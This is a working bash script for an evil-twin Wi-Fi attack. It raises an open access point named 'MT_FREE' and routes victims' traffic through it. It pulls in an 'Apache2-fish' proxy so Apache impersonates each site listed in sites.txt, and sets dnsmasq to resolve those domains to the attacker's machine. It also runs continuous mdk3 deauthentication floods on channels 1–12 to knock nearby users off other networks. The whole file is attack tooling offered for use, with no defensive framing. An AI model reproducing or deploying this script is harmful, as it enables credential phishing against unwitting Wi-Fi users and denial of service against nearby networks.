#!/bin/bash

INTERNET_IFACE="eth1"
AP_IFACE="wlan1"
MDK3_IFACE="wlan2"

AP_ESSID="MT_FREE"
AP_CHANELL="1"
AP_IP="192.168.100.1"
AP_MASK="24"

DHCP_FIRST="192.168.100.10"
DHCP_LAST="192.168.100.250"
DHCP_MASK="255.255.255.0"
RESOLVE_SERVER_1="1.1.1.1"
RESOLVE_SERVER_2="1.0.0.1"

DEAUTH_CHANNEL="1,2,3,4,5,6,7,8,9,10,11,12"

CURRENT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
CURRENT_NAME="$(basename "$(test -L "$0" && readlink "$0" || echo "$0")")"
LOG_DIR="/var/log"

BLUE='\033[1;34m'
RED='\033[1;31m'
GREEN='\033[1;32m'
ORANGE='\033[1;33m'
NC='\033[0m'

INFO="${BLUE}[*]${NC} "
ERROR="${RED}[-]${NC} "
SUCESS="${GREEN}[+]${NC} "
WARNING="${ORANGE}[!]${NC} "

# Delete certs and keys
#while read -r site
#do
#	if ! [ -z "$site" ]; then
#		host="${site//https:\/\//}"
#		host="${host//http:\/\//}"
#		rm /etc/ssl/certs/${host}.crt 2>/dev/null
#        rm /etc/ssl/certs/${host}.pem 2>/dev/null
#        rm /etc/ssl/private/${host}.key 2>/dev/null
#	fi
#done < ${CURRENT_DIR}/sites.txt
#
#echo "DEBUG"
#sleep 120

# Kill others copy of this script
while read -r PID
do
    if [ ${PID} -lt $$ ]
    then
        kill -9 ${PID}
    fi
done < <(pgrep "${CURRENT_NAME}")

# Kill interrupt process
/etc/init.d/network-manager stop 2>/dev/null
killall wpa_supplicant 2>/dev/null

# Interface settings
while true
do
	if ip link show | grep "${INTERNET_IFACE}" >/dev/null 2>&1; then
		echo -e "${SUCESS}Interface ${INTERNET_IFACE} exist!";
		break
	else
		echo -e "${ERROR}Interface ${INTERNET_IFACE} not found, wait..."
		sleep 10
fi
done

while true
do
	if ip link show | grep "${AP_IFACE}" >/dev/null 2>&1; then
		echo -e "${SUCESS}Interface ${AP_IFACE} exist!";
		break
	else
		echo -e "${ERROR}Interface ${AP_IFACE} not found, wait..."
		sleep 10
fi
done

while true
do
	if ip link show | grep "${MDK3_IFACE}" >/dev/null 2>&1; then
		echo -e "${SUCESS}Interface ${MDK3_IFACE} exist!";
		break
	else
		echo -e "${ERROR}Interface ${MDK3_IFACE} not found, wait..."
		sleep 10
fi
done

while true
do
	dhclient ${INTERNET_IFACE} >/dev/null 2>&1
    if ifconfig ${INTERNET_IFACE} | grep "inet " >/dev/null 2>&1; then
        echo -e "${SUCESS}Interface ${INTERNET_IFACE} is configured.";
        break
    else
        echo -e "${SUCESS}Interface ${INTERNET_IFACE} is not configured, wait..."
        sleep 10
fi
done

ifconfig ${AP_IFACE} down
ifconfig ${AP_IFACE} ${AP_IP}/${AP_MASK}
ifconfig ${AP_IFACE} up

ifconfig ${MDK3_IFACE} down
iwconfig ${MDK3_IFACE} mode monitor
ifconfig ${MDK3_IFACE} up

# Check installed programs
if ! dpkg --list | grep -qe "ii\s*apache2 " || ! dpkg --list | grep -qe "ii\s*libapache2-mod-security2 " || ! dpkg --list | grep -qe "ii\s*hostapd " || ! dpkg --list | grep -qe "ii\s*dnsmasq-base " || ! dpkg --list | grep -qe "ii\s*mdk3 "
then
    apt update
    apt -y -qq install apache2 libapache2-mod-security2 hostapd dnsmasq-base mdk3
fi

# IP forward
iptables -t nat -F
iptables -t nat -X
iptables -F
iptables -X

iptables -t nat -A POSTROUTING -o ${INTERNET_IFACE} -j MASQUERADE
iptables -A FORWARD -i ${AP_IFACE} -o ${INTERNET_IFACE} -j ACCEPT
echo '1' > /proc/sys/net/ipv4/ip_forward

# Apache2 fish settings
if [ ! -d "${CURRENT_DIR}/Apache2-fish/" ]; then
    git clone https://github.com/Vladimir-Ivanov-Git/Apache2-fish.git ${CURRENT_DIR}/Apache2-fish/
fi

if [ -f "${CURRENT_DIR}/hosts.txt" ]; then
	rm -f ${CURRENT_DIR}/hosts.txt
fi

python ${CURRENT_DIR}/Apache2-fish/apache2_setup_proxy.py -E

while read -r site
do
	if ! [ -z "$site" ]; then
		python ${CURRENT_DIR}/Apache2-fish/apache2_setup_proxy.py -q -u ${site}
		host="${site//https:\/\//}"
		host="${host//http:\/\//}"
		echo -e "${host}" >> ${CURRENT_DIR}/hosts.txt
	fi
done < ${CURRENT_DIR}/sites.txt

while read -r site
do
    a2ensite $site >/dev/null 2>&1
done < <(ls /etc/apache2/sites-available/)

/etc/init.d/apache2 restart

# Hostapd settings
cat >${CURRENT_DIR}/hostapd.conf <<EOH
interface=${AP_IFACE}
driver=nl80211
ssid=${AP_ESSID}
channel=${AP_CHANELL}
EOH

chmod 666 ${CURRENT_DIR}/hostapd.conf
kill -9 $(pgrep hostapd) 2>/dev/null

while true
do
    if pgrep -x "hostapd" > /dev/null
    then
        sleep 10
    else
        /usr/sbin/hostapd ${CURRENT_DIR}/hostapd.conf -B -f ${LOG_DIR}/hostapd.log
    fi
done &

# Dnsmasq settings
cat >${CURRENT_DIR}/dnsmasq.conf <<EOD
server=${RESOLVE_SERVER_1}
server=${RESOLVE_SERVER_2}
interface=${AP_IFACE}
bind-interfaces
domain-needed
bogus-priv
domain=local.net
expand-hosts
local=/local.net/
dhcp-range=${DHCP_FIRST},${DHCP_LAST},${DHCP_MASK},12h
dhcp-option=3,${AP_IP}
dhcp-option=6,${AP_IP}
log-queries
log-facility=${LOG_DIR}/dnsmasq.log
EOD

echo -n "address=/" >> ${CURRENT_DIR}/dnsmasq.conf
while read -r domain
do
        echo -n "${domain}/" >> ${CURRENT_DIR}/dnsmasq.conf
done < ${CURRENT_DIR}/hosts.txt

echo "${AP_IP}" >> ${CURRENT_DIR}/dnsmasq.conf
rm ${CURRENT_DIR}/hosts.txt

chmod 666 ${CURRENT_DIR}/dnsmasq.conf
kill -9 $(pgrep dnsmasq) 2>/dev/null

while true
do
    if pgrep -x "dnsmasq" > /dev/null
    then
        sleep 10
    else
        /usr/sbin/dnsmasq -C ${CURRENT_DIR}/dnsmasq.conf
    fi
done &

# MDK3 settings
cat /sys/class/net/${AP_IFACE}/address > ${CURRENT_DIR}/whilelist.txt

chmod 666 ${CURRENT_DIR}/whilelist.txt
kill -9 $(pgrep mdk3) 2>/dev/null

while true
do
    if pgrep -x "mdk3" > /dev/null
    then
        sleep 10
    else
        /usr/sbin/mdk3 ${MDK3_IFACE} d -w ${CURRENT_DIR}/whilelist.txt -c ${DEAUTH_CHANNEL} >${LOG_DIR}/mdk3.log 2>&1 &
    fi
done &